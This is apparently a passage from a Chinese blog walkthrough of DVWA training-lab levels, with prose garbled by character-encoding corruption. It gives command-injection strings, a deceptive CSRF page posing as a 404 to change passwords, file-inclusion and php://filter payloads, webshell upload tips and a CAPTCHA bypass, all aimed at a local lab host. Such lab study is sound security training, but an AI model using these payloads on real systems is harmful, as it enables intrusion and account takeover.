çš„è¯å¯ä»¥ä½¿ç”¨%dfæ¥è¿›è¡Œç»•è¿‡\ä½†æ˜¯è¿™å…³ä¸æ˜¯<br>é‚£ä¹ˆè¿™å…³å°±æ— æ³•è¿›è¡Œæ³¨å…¥äº†ã€‚è€Œä¸”æˆ‘ä»¬åœ¨æŸ¥çœ‹ä¸€ä¸‹ä»£ç å¯ä»¥å‘ç°åªè¦ç™»é™†å¤±è´¥å°±ä¼šæ¿€æ´»sleep(2)å‡½æ•°å¯¼è‡´çˆ†ç ´é€Ÿåº¦å˜æ…¢ï¼Œä½†æ˜¯æˆ‘ä»¬ä»ç„¶å¯ä»¥è¿›è¡Œçˆ†ç ´</p><h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><h3 id="token"><a href="#token" class="headerlink" title="token"></a>token</h3><p>tokenæ˜¯é˜²æ­¢é‡å¤ç™»é™†çˆ†ç ´çš„ä¸€ç§æ–¹å¼ï¼Œtokenæ˜¯ç”±æœåŠ¡ç«¯éšæœºç”Ÿæˆï¼Œå‘é€åˆ°å®¢æˆ·ç«¯ï¼Œå°†å…¶ä¿å­˜åœ¨å®¢æˆ·ç«¯çš„cookieæˆ–è€…sessioné‡Œï¼Œåœ¨ç”¨æˆ·ç™»é™†æ—¶å°†å…¶ä¸€åŒåœ¨è¡¨å•é‡Œå‘é€ï¼Œå½“è¡¨å•å‘é€åˆ°æœåŠ¡ç«¯æ—¶æœåŠ¡å™¨ä¼šåˆ·æ–°tokenå¹¶å†å‘é€åˆ°ç”¨æˆ·ç«¯ã€‚è¿™ä¹Ÿå°±å¯¼è‡´æˆ‘ä»¬ç›´æ¥ä½¿ç”¨bpæ¥è¿›è¡Œç®€å•çš„çˆ†ç ´å°±ä¼šå¯¼è‡´å†å‘é€ç¬¬äºŒæ¬¡çš„æ—¶å€™ç”±äºå‘é€çš„tokenä¸æœåŠ¡ç«¯ä¸åŒå¯¼è‡´æ— æ³•æˆåŠŸã€‚è¿™ä½¿ç”¨æˆ‘ä»¬éœ€è¦æ›´æ”¹ä¸€äº›è®¾ç½®ä½¿å…¶å¯ä»¥å°†ä¸Šä¸€æ¬¡æœåŠ¡å™¨å‘é€çš„å“åº”æ¥è·å–tokenè¿›è¡Œçˆ†ç ´<br><img src="/2024/01/01/DVWA%E7%9A%84wp/3.png" class="" title="Alt text"><br>æˆ‘ä»¬å°†tokenä¹Ÿæ·»åŠ ä¸ºæœ‰æ•ˆè½½è·<br><img src="/2024/01/01/DVWA%E7%9A%84wp/4.png" class="" title="Alt text"><br>åœ¨å°†æ”»å‡»çº¿ç¨‹è°ƒæ•´ä¸º1å› ä¸ºåœ¨å‘é€åæœåŠ¡çš„å°±ä¼šåˆ·æ–°tokenæ‰€ä»¥æ— æ³•è¿›è¡Œå¤šçº¿ç¨‹çˆ†ç ´<br><img src="/2024/01/01/DVWA%E7%9A%84wp/5.png" class="" title="Alt text"><br><img src="/2024/01/01/DVWA%E7%9A%84wp/6.png" class="" title="Alt text"><br>æˆ‘ä»¬å°†é‡å®šå‘æ¡ä»¶ä¸ºæ€»æ˜¯ï¼Œå†æ·»åŠ æ£€ç´¢æå–ï¼Œç‚¹å‡»é‡æ–°è·å–å“åº”ï¼Œæ‰¾åˆ°tokençš„å†…å®¹å³é”®é€‰æ‹©å†ç‚¹å‡»ç¡®å®šï¼Œ<img src="/2024/01/01/DVWA%E7%9A%84wp/2.png" class="" title="Alt text"><br>ä¹‹åè¿™ç§tokené€‰æ‹©é€’å½’æå–ï¼Œå°†åˆšæ‰çš„tokenå¤åˆ¶åˆ°åˆå§‹payloadé‡Œå°±å¯ä»¥å¼€å§‹çˆ†ç ´äº†</p><h2 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h2><p>è¿™ä¸€å…³ç”±äºè¾“å…¥äº†ä¸‰æ¬¡é”™è¯¯ä»¥ä¸Šå°±ä¼šé”å®šå¯¼è‡´çˆ†ç ´çš„æ—¶é—´å¤§å¤§å¢åŠ æ‰€ä»¥æ¯”è¾ƒå®‰å…¨</p><h1 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h1><h2 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h2><p>è¿™ä¸ªæˆ‘ä»¬æŸ¥çœ‹æºç å¯ä»¥å‘ç°å…¶å«æœ‰ä¸€ä¸ªå‡½æ•°shell_execè¿™ä¸ªå‡½æ•°ä¼šå°†å‚æ•°å½“æˆæŒ‡ä»¤è¿è¡Œï¼Œè€Œä¸”ç”±äºè¯¥å‡½æ•°æ²¡æœ‰å¯¹æ¯ä¸ªå­—ç¬¦å’ŒæŒ‡ä»¤è¿‡æ»¤å¯¼è‡´æˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨è¾“å…¥çš„ipåä½¿ç”¨è¿æ¥ç¬¦è¿æ¥ä¸€ä¸ªæŒ‡ä»¤å¯¼è‡´æœåŠ¡å™¨ç«¯ä¿¡æ¯æ³„éœ²<br>ä¸‹é¢æ˜¯ä¸€äº›å‘½ä»¤æ‹¼æ¥ç¬¦å·<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A;B Aè¿è¡ŒæˆåŠŸä¸å¤±è´¥éƒ½ä¼šè¿è¡ŒB</span><br><span class="line">A|B å°†Aè¿è¡Œçš„ç»“æœå½“ä½œBçš„å‚æ•°è¿è¡Œ</span><br><span class="line">A&amp;B Aåœ¨åå°è¿è¡ŒABåŒæ—¶è¿è¡Œ</span><br><span class="line">A&amp;&amp;B AæˆåŠŸè¿è¡ŒB</span><br><span class="line">A||B Aå¤±è´¥è¿è¡ŒB</span><br></pre></td></tr></table></figure><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|dir</span><br></pre></td></tr></table></figure></p><h2 id="Mediun"><a href="#Mediun" class="headerlink" title="Mediun"></a>Mediun</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">       <span class="string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>a,</span><br><span class="line">       <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">   );</span><br><span class="line"></span><br><span class="line">   <span class="variable">$target</span> = <span class="title function_ invoke__">str_replace</span>( <span class="title function_ invoke__">array_keys</span>( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br></pre></td></tr></table></figure><p>ä¸­ç­‰éš¾åº¦æ˜¯åˆ©ç”¨str_replaceå‡½æ•°æ¥è¿›è¡Œè¿‡æ»¤è¿™ä¸ªå‡½æ•°æˆ‘ä»¬åœ¨sqlæ³¨å…¥æ—¶ä¹Ÿé‡åˆ°è¿‡æ—¶å°†å­—ç¬¦ä¸²ä¸­å‡ºç°çš„é»‘åå•å­—ç¬¦ä¸²è¿›è¡Œæ›¿æ¢ï¼Œè¿™ä¸ªå‡½æ•°ä¸­å°†æ•°ç»„çš„keyä¹Ÿå°±æ˜¯&amp;&amp;å’Œ;æ›¿æ¢æˆäº†ç©ºä½†æ˜¯è¿˜æœ‰å…¶ä»–è¿æ¥ç¬¦æ²¡æœ‰è¿›è¡Œè¿‡æ»¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨|æ¥è¿›è¡Œè¿æ¥</p><h2 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h2><p>é«˜éš¾åº¦æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹æºç å¯ä»¥å‘ç°<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&amp;&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">&#x27;;&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">&#x27;| &#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">&#x27;-&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">&#x27;$&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">&#x27;(&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">&#x27;)&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">&#x27;`&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">&#x27;||&#x27; =&gt; &#x27;&#x27;,</span><br></pre></td></tr></table></figure><br>å‡ ä¹æŠŠè¿æ¥ç¬¦è¿‡æ»¤äº†ï¼Œä½†æ˜¯æˆ‘ä»¬ä»”ç»†çœ‹çœ‹ä¼šå‘ç°å…¶æ˜¯å°†â€™| â€˜å˜ä¸ºç©ºæ‰€ä»¥æˆ‘å¯ä»¥ç›´æ¥ä½¿ç”¨<code>127.0.0.1|dir</code></p><h2 id="impossible-1"><a href="#impossible-1" class="headerlink" title="impossible"></a>impossible</h2><p>è¿™å…³æˆ‘ä»¬æŸ¥çœ‹æºç æ¥å­¦ä¹ ä¸€ä¸‹<br><img src="/2024/01/01/DVWA%E7%9A%84wp/2-1.png" class="" title="Alt text"><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶åˆ©ç”¨äº†expload()å‡½æ•°å°†ç”±ç‚¹åˆ†å‰²çš„å­—ç¬¦ä¸²ä¿å­˜ä¸ºæ•°ç»„ï¼Œåœ¨åˆ©ç”¨is_number()æ¥æ£€æµ‹å…¶æ˜¯å¦ä¸ºæ•°å­—ï¼Œå¹¶ä¸”è¯¥æ•°æ•°ç»„å¤§å°ä¸º4ã€‚ç”±äºæˆ‘ä»¬åœ¨æœ€åæ¥ä¸Šäº†æŒ‡ä»¤å¯¼è‡´å…¶æœ€åä¸€ä¸ªä¸ä¸ºæ•°å­—ï¼Œæ— æ³•è¿›è¡Œæ³¨å…¥</p><h1 id="DVMA-CSRF"><a href="#DVMA-CSRF" class="headerlink" title="DVMA-CSRF"></a>DVMA-CSRF</h1><h2 id="LOW-1"><a href="#LOW-1" class="headerlink" title="LOW"></a>LOW</h2><p>è¿™ä¸ªLOWéš¾åº¦æˆ‘ä»¬æŸ¥çœ‹æºç å¯ä»¥å‘ç°åªæœ‰ä¸¤æ¬¡ç§˜å¯†ç›¸åŒå°±å¯ä»¥æˆåŠŸä¿®æ”¹å¯†ç æ²¡æœ‰è¿›è¡Œä»»ä½•è¿‡æ»¤å¹¶ä¸”å…¶å¯†ç æ˜¯ä½¿ç”¨GETä¼ å€¼ï¼Œæˆ‘ä»¬å°è¯•ä¿®æ”¹ä¸€ä¸‹å¯†ç ï¼Œå¾—åˆ°urlä¸º<code>http://192.168.32.1/DVWA-master/vulnerabilities/csrf/?password_new=2&amp;password_conf=2&amp;Change=Change#</code>è¿™æ—¶å€™æˆ‘ä»¬å°†å…¶è¿›è¡Œä¿®æ”¹<code>http://192.168.32.1/DVWA-master/vulnerabilities/csrf/?password_new=3333&amp;password_conf=3333&amp;Change=Change#</code>ä¹‹åå†å…¶ä»–ç½‘é¡µè®¿é—®å‘ç°ï¼ŒæˆåŠŸå°†å¯†ç ä¿®æ”¹ä¸ºäº†3333ä½†æ˜¯è¿™ç§æ–¹æ³•å±å®æ˜¯æœ‰ç‚¹å‚»ï¼Œè¿™æ—¶å€™æˆ‘ä»¬æœ‰ä»¥ä¸‹ä¸¤ç§æ–¹æ³•è¿›è¡Œä¿®æ”¹</p><h2 id="1ã€‚çŸ­é“¾"><a href="#1ã€‚çŸ­é“¾" class="headerlink" title="1ã€‚çŸ­é“¾"></a>1ã€‚çŸ­é“¾</h2><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨çŸ­é“¾ç”Ÿæˆå·¥å…·çš„åœ¨çº¿ç½‘ç«™å°†è¯¥é“¾æ¥è¿›è¡Œè½¬æ¢ã€‚</p><h2 id="2ï¼š"><a href="#2ï¼š" class="headerlink" title="2ï¼š"></a>2ï¼š</h2><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹htmlæ–‡ä»¶å°†htmlæ–‡ä»¶æ”¾åœ¨webé‡Œï¼Œè¿™æ—¶å€™ç½‘é¡µä¼šè‡ªåŠ¨å‘é€è¯·æ±‚ã€‚è¯¥æ–¹æ³•æ›´åŠ éšè”½ä¹Ÿå¸¸ç”¨ä»£ç å¦‚ä¸‹<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSRF<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.32.1/DVWA-master/vulnerabilities/csrf/?password_new=3333&amp;password_conf=3333&amp;Change=Change#&quot;</span><span class="attr">border</span>=<span class="string">&quot;0&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">    404<span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">h2</span>&gt;</span></span><br><span class="line">           file not found.<span class="tag">&lt;<span class="name">h2</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>è¿™æ—¶å€™æˆ‘ä»¬è®¿é—®è¯¥ç½‘ç«™ä¼šæ˜¾ç¤º404è¿™å›ä½¿ç”¨æˆ·è¯¯è®¤ä¸ºè®¿é—®é”™è¯¯äº†ï¼Œä½†æ˜¯å…¶å®å¯†ç å·²ç»è¢«ä¿®æ”¹äº†ã€‚<br><img src="/2024/01/01/DVWA%E7%9A%84wp/2.png" class="" title="Alt text"></p><h1 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h1><img src="/2024/01/01/DVWA%E7%9A%84wp/3.png" class="" title="Alt text"><p>æˆ‘ä»¬æŸ¥çœ‹ä»£ç å‘ç°æ¯”LOWå¤šäº†ä¸ª<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">stripos</span>( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;HTTP_REFERER&#x27;</span> ] ,<span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="literal">false</span> )</span><br></pre></td></tr></table></figure><br>è¿™ä¸ªä»£ç çš„ä½œç”¨ä½¿åŒ¹é…æˆ‘ä»¬å‘é€çš„refererå¤´æŸ¥çœ‹æ˜¯å¦ä¸ºæœåŠ¡å™¨åç§°ï¼Œå¦‚æœrefereré‡Œå«æœ‰æœåŠ¡å™¨åç§°åˆ™ä¿®æ”¹å¯†ç ã€‚<br>è¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥ç›´æ¥å°†htmlæ–‡ä»¶æ”¹ä¸ºä¸»æœºåç§°ã€‚è¿™æ ·å­å†å‘é€æ—¶refererå¤´å°±å›åŒ…å«ä¸»æœºåç§°</p><h2 id="high-2"><a href="#high-2" class="headerlink" title="high"></a>high</h2><p>highéš¾åº¦çš„å› ä¸ºå…¶éœ€è¦è¿ç”¨åˆ°xssçš„å†…å®¹å†å­¦ä¹ ç½‘xssåå†è¡¥å……ã€‚</p><h2 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h2><p>è¯¥å¤§å…³ä¸»è¦æ˜¯è€ƒå¯Ÿæ–‡ä»¶åŒ…å«æ¼æ´<br>æ–‡ä»¶åŒ…å«æ¼æ´çš„å…·ä½“å¯ä»¥æŸ¥çœ‹è¿™ç¯‡åšå®¢<a href="https://blog.csdn.net/m0_46467017/article/details/126380415?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170445517316800222874316%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=170445517316800222874316&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-126380415-null-null.142^v99^pc_search_result_base2&amp;utm_term=%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E&amp;spm=1018.2226.3001.4187">æ–‡ä»¶åŒ…å«æ¼æ´</a></p><h2 id="LOW-2"><a href="#LOW-2" class="headerlink" title="LOW"></a>LOW</h2><p>è¿™ä¸€å…³æˆ‘ä»¬æŸ¥çœ‹æºç å¯ä»¥å‘ç°æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œè¿™å¯¼è‡´æˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨æ–‡ä»¶åŒ…å«æ¼æ´ã€‚<br>æ¯”å¦‚ï¼š<br>æœ¬åœ°åŒ…å«æ¼æ´ï¼š<code>http://192.168.32.1/DVWA-master/vulnerabilities/fi/?page=C:Windows/system.ini</code>å¦‚æœè¯¥é¡µé¢æ–‡ä»¶ä½äºcç›˜å¯ä»¥æ”¹ä¸ºæ”¹ä¸ºâ€¦...\Windows\system.ini<br>è¿œç¨‹åŒ…å«æ¼æ´ï¼š<code>http://192.168.32.1/DVWA-master/vulnerabilities/fi/?page=https://lisien11.github.io/404.html</code>è¿™æ ·å°±ä¼šåŒ…å«æˆ‘åšå®¢çš„404é¡µé¢å†…å®¹<br>ä¹Ÿå¯ä»¥ä½¿ç”¨phpä¼ªåè®®æ¥è¾“å‡ºindex.phpå†…å®¹ï¼š<code>http://192.168.32.1/DVWA-master/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php</code></p><h2 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h2><p>æ‰“å¼€æºç å‘ç°è¿‡æ»¤äº†<code>http://å’Œhttps://</code>ä½†æ˜¯ç”±äºå…¶è¿‡æ»¤çš„å‡½æ•°ä¸ºstr_replace()è¿™ä¸ªå‡½æ•°æˆ‘ä»¬å†sqlæ³¨å…¥æ—¶è§è¿‡åªè¦ä½¿ç”¨åŒå†™å°±å¯ä»¥ç»•è¿‡å¦‚ï¼š<code>http://192.168.32.1/DVWA-master/vulnerabilities/fi/?page=htthttps://ps://lisien11.github.io/404.html</code></p><h2 id="high-3"><a href="#high-3" class="headerlink" title="high"></a>high</h2><p>æˆ‘ä»¬æ‰“å¼€æºç å‘ç°å…¶è¦æ±‚æ–‡ä»¶çš„å¼€å¤´å¿…é¡»è¦ä¸ºfileæˆ–è€…æ–‡ä»¶åä¸ºinclude.php<br>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>file://</code>ä¼ªåè®®æ¥ç»•è¿‡</p><h2 id="impossible-2"><a href="#impossible-2" class="headerlink" title="impossible"></a>impossible</h2><p>ç”±äºæºç çš„è¿‡æ»¤æ˜¯ç›´æ¥æŒ‡å®šå¯åŒ…å«æ–‡ä»¶çš„åå­—ï¼Œæ‰€ä»¥æ— æ³•ä½¿ç”¨æ–‡ä»¶åŒ…å«æ¼æ´ã€‚</p><h1 id="File-upload"><a href="#File-upload" class="headerlink" title="File upload"></a>File upload</h1><h2 id="LOW-3"><a href="#LOW-3" class="headerlink" title="LOW"></a>LOW</h2><p>ç›´æ¥ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œèšå‰‘é“¾æ¥å³å¯</p><h2 id="Medium-2"><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h2><p>å› ä¸ºå…¶æ£€æŸ¥æ˜¯è€ƒMIMEæ‰€ä»¥ç›´æ¥ä¸Šä¼ æŠ“åŒ…ä¿®æ”¹åç¼€ä¸ºphp</p><h2 id="high-4"><a href="#high-4" class="headerlink" title="high"></a>high</h2><p>ç›´æ¥ä¸Šä¼ å›¾ç‰‡é©¬ä½¿ç”¨æ–‡ä»¶åŒ…å«æ¼æ´å³å¯</p><h2 id="impossible-3"><a href="#impossible-3" class="headerlink" title="impossible"></a>impossible</h2><p>è¯¥ä»£ç å°†æ–‡ä»¶åå­—åšäº†éšæœºå¤„ç†ï¼Œå¹¶ä¸”åªèƒ½ä¸Šä¼ jpgå’Œpngï¼Œè€Œè¯¥ä»£ç ä¼šå¯¹å›¾ç‰‡è¿›è¡Œå‹ç¼©å¯¼è‡´å…¶äºŒè¿›åˆ¶ç¼–ç å‘ç”Ÿæ”¹å˜ï¼Œè™½ç„¶gifå¯ä»¥ä¿ç•™ä¸€ç‚¹ä½†æ˜¯ç”±äºæ— æ³•ä¸Šä¼ gifæ‰€ä»¥éå¸¸å®‰å…¨</p><h1 id="Insecure-CAPTCHA"><a href="#Insecure-CAPTCHA" class="headerlink" title="Insecure CAPTCHA"></a>Insecure CAPTCHA</h1><h2 id="LOW-4"><a href="#LOW-4" class="headerlink" title="LOW"></a>LOW</h2><p>è¿™å…³çš„ä¸»è¦ç›®çš„æ˜¯ç»•è¿‡éªŒè¯ç æ¥å¯¹å¯†ç è¿›è¡Œä¿®æ”¹ï¼Œæˆ‘ä»¬æŸ¥çœ‹æºç å‘ç°stepä¸º1æ—¶è¿›è¡ŒéªŒè¯ç éªŒè¯ï¼Œstepä¸º2æ—¶ç›´æ¥è¿›è¡Œå¯†ç ä¿®æ”¹çš„ç¨‹åºæ‰€ä»¥æˆ‘ä»¬ç›´æ¥æŠ“åŒ…å°†stepæ”¹ä¸º2å³å¯</p><h2 id="Medium-3"><a href="#Medium-3" class="headerlink" title="Medium"></a>Medium</h2><p>æˆ‘ä»¬æŸ¥çœ‹æºç å‘ç°å…¶å°±æ¯”LOWå¤šäº†ä¸€æ®µ<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( !<span class="variable">$_POST</span>[ <span class="string">&#x27;passed_captcha&#x27;</span> ] ) &#123;</span><br><span class="line">        <span class="variable">$html</span>     .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬è¦ç»•è¿‡è¿™ä¸ªéœ€è¦æŠ“åŒ…ä¼ passed_captchaçš„å€¼ä¸ºture</p><h2 id="high-5"><a href="#high-5" class="headerlink" title="high"></a>high</h2><p>æˆ‘ä»¬æŸ¥çœ‹æºç å¯ä»¥å‘ç°<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$resp</span> || (<span class="variable">$_POST</span>[ <span class="string">&#x27;g-recaptcha-response&#x27;</span> ] == <span class="string">&#x27;hidd3n_valu3&#x27;</span>&amp;&amp; <span class="variable">$_SERVER</span>[ <span class="string">&#x27;HTTP_USER_AGENT&#x27;</span> ] == <span class="string">&#x27;reCAPTCHA&#x27;</span>))</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬éœ€è¦ç»•è¿‡ä»¥ä¸Šä»£ç <br>å¯ä»¥å‘ç°æˆ‘ä»¬å¯ä»¥å°†g-recaptcha-responseçš„å€¼ä¼ ä¸ºhidd3n_valu3å°†HTTP_USER_AGENTçš„å€¼ä¼ ä¸ºreCAPTCHAå°±å¯ä»¥ç»•è¿‡</p><h1 id="impossible-4"><a href="#impossible-4" class="headerlink" title="impossible"></a>impossible</h1><p>è¦æ±‚è¾“å…¥åŸå¯†ç ã€‚</p><h1 id="weak-session-id"><a href="#weak-session-id" class="headerlink" title="weak session id"></a>weak session id</h1><h1 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id&#x27;</span>]++;</span><br><span class="line">    <span class="variable">$cookie_value</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;dvwaSession&quot;</span>, <span class="variable">$cookie_value</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥å°†sessionä»0ä¸æ–­åŠ 1ç”Ÿæˆ</p><h1 id="Medium-4"><a href="#Medium-4" class="headerlink" title="Medium"></a>Medium</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$cookie_value</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;dvwaSession&quot;</span>, <span class="variable">$cookie_value</span>);</span><br></pre></td></tr></table></figure><p>å°†æ—¶é—´æˆ³è®¾ç½®ä¸ºsessionï¼Œæ—¶é—´æˆ³æ˜¯ä¸å®‰å…¨çš„</p><h1 id="high-6"><a href="#high-6" class="headerlink" title="high"></a>high</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id_high&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id_high&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id_high&#x27;</span>]++;</span><br><span class="line">    <span class="variable">$cookie_value</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id_high&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;dvwaSession&quot;</span>, <span class="variable">$cookie_value</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>, <span class="string">&quot;/vulnerabilities/weak_id/&quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>], <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>setcookie(name,value,expire,path,domain,secure,httponly)</p><p>name å¿…éœ€ã€‚è§„å®šcookieçš„åç§°ã€‚<br>value å¿…éœ€ã€‚è§„å®šcookieçš„å€¼ã€‚<br>expire å¯é€‰ã€‚è§„å®šcookieçš„æœ‰æ•ˆæœŸã€‚<br>path å¯é€‰ã€‚è§„å®šcookieçš„æœåŠ¡å™¨è·¯å¾„ã€‚<br>domain å¯é€‰ã€‚è§„å®šcookieçš„åŸŸåã€‚<br>secure å¯é€‰ã€‚è§„å®šæ˜¯å¦é€šè¿‡å®‰å…¨çš„HTTPSè¿æ¥æ¥ä¼ cookieã€‚<br>httponly å¯é€‰ã€‚è§„å®šæ˜¯å¦Cookieä»…å¯é€šè¿‡HTTPåè®®è®¿é—®ã€‚</p><p>å°†sessionä»0ä¸æ–­åŠ 1æˆ–è¿›è¡Œmd5åŠ å¯†è¿›è¡Œè®¾ç½®ï¼Œä»ç„¶å…·æœ‰è§„å¾‹æ€§è¿˜æ˜¯å¾ˆä¸å®‰å…¨</p><h1 id="impossible-5"><a href="#impossible-5" class="headerlink" title="impossible"></a>impossible</h1><figure class="highlight 